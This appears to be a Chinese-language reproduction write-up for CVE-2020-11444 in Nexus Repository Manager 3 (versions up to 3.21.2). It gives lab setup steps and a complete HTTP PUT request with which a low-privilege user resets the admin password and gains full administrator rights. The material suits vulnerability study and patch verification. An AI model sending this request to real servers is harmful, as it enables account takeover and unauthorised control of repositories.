CVE-2020-11444 Nexus Repository Manager 3

影响版本：<= 3.21.2
Affected Versions:  All previous Nexus Repository Manager 3 OSS/Pro versions up to and including 3.21.2

Fixed in Version:  Nexus Repository Manager OSS/Pro version 3.22.0

### 1. 拉取镜像
```
docker pull sonatype/nexus3:3.21.2
```

### 2. 创建nexus数据目录
```
mkdir /your-dir/nexus-data && chown -R 200 /your-dir/nexus-data
```

### 3. 运行nexus docker镜像
```
docker run -d --rm -p 8081:8081 -p 5050:5050 --name nexus -v /your-dir/nexus-data:/nexus-data -e INSTALL4J_ADD_VM_PARAMS="-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g  -Djava.util.prefs.userRoot=/nexus-data -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050" sonatype/nexus3::3.21.2
```

### 4. github下载源码 & idea远程debug
```
git clone https://github.com/sonatype/nexus-public.git
git checkout -b release-3.21.0-05 origin/release-3.21.0-05
```
idea创建远程debug-启动
```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050
```
漏洞点在 org.sonatype.nexus.security.internal.rest.UserApiResource#changePassword 接口

新版本在 org.sonatype.nexus.security.internal.DefaultSecuritySystem#changePassword(java.lang.String, java.lang.String, boolean) 修复

### 5. 登陆任何一个账号

### 6. 调用更新role接口
数据包：
```
PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 6
accept: application/json
Sec-Fetch-Dest: empty
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.6080434247960143
Content-Type: text/plain
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8081/swagger-ui/?_v=3.21.1-01&_e=OSS
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=af3706e2-dc9e-47fa-9739-edb6b3d512fe
Connection: close

123456
```

### 7. 使用admin & 123456登陆，获得最高管理员权限